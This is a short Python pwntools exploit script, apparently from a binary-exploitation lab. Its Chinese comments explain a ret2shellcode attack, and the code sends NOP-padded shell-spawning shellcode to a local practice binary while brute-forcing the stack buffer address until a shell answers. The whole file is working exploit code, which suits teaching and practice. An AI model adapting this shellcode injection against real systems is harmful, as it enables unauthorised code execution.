#!/usr/bin/env python3
# ret2shellcode：栈上执行 shellcode。
# 关闭 ASLR 后栈地址仍受 argv/env 影响，因此 exp 用 NOP 雪橇 + 小范围枚举来确定缓冲区地址。
import os
from pwn import *
import time
context.log_level='error'
context.arch='i386'
BIN=os.path.abspath('../src/ret2shellcode')
shell=asm(shellcraft.sh())
hit=None
for base in range(0xffffd800, 0xffffe000, 0x40):
    payload=shell.ljust(112,b'\x90')+p32(base)
    io=process(BIN, env={})
    io.sendline(payload)
    time.sleep(0.15)
    try:
        io.sendline(b'echo HIT_%x; exit'%base)
        out=io.recvall(timeout=1.2)
    except Exception:
        out=b''
    io.close()
    if b'HIT_' in out:
        hit=(base,out); break
if hit:
    base,out=hit
    print('BUF ~ 0x%x'%base, file=sys.stderr)
    print(out.decode('utf-8','replace'))
else:
    print('[-] not found')